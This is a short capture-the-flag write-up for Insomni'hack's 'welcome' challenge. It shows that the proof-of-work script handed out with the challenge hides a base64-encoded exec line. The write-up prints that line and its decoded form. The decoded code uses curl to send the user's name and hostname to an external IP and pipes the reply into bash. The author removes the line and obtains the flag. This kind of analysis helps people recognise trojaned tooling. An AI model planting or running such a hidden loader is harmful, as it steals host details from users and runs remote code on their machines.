# welcome

> This year we added a Proof of Work to some of our challenges.

> Just run `python pow.py <target>,` were `target` is the value provided by the server and get the flag.

> [pow](pow-b39e9d8f81a48ac92097ce060d587ace718c2db8bc9b3906ac640b90a62dc497.py)

> `nc welcome.insomnihack.ch 1337`

If we follow the instructions given in the description, we'll get the following response from the server:
```
«Welcome to the wall of shame 2.0!» ~Mallory
```

Let's have a look at the provided script. Once the correct input is computed, it executes some fishy code:

```python
exec(base64.b64decode('Z2xvYmFsIGk7aSs9MTMzNzt4PW9zLm5hbWU7eCs9Ii8kKHdob2FtaSlAJChob3N0bmFtZSl8YmFzaCJpZiB4IT0ibnQiZWxzZSIvJVVTRVJOQU1FJUAlVVNFUkRPTUFJTiUiO29zLnN5c3RlbSgiY3VybCAtTnMgMzQuNjUuMTg3LjE0MS8iK3gp'))
```

Base64 decoded (`;` replaced with newlines for readability):
```python
global i
i+=1337
x=os.name
x+="/$(whoami)@$(hostname)|bash" if x!="nt" else "/%USERNAME%@%USERDOMAIN%"
os.system("curl -Ns 34.65.187.141/"+x)
```

We can see that the code increments variable `i` by `1337` (that's why we get wrong result). It also sends our username and hostname to some remote server and executes some code in bash.

When we remove the suspicious line, everything works as expected and we get a flag.

Flag: `INS{Miss me with that fhisy line}`